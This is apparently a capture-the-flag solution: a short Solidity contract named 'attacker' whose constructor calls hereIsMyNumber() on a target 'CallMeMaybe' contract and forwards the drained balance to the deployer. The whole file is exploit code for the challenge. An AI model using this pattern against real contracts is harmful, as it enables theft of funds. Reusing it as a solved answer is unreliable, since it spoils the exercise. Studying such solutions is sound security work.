// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CTF2.sol";

contract attacker{
    CallMeMaybe public carly;
    address owner;

    constructor(address payable _callMeMaybe){
        owner = msg.sender;
        carly = CallMeMaybe(_callMeMaybe);
        carly.hereIsMyNumber();
        payable(owner).transfer(address(this).balance);
    }
    
}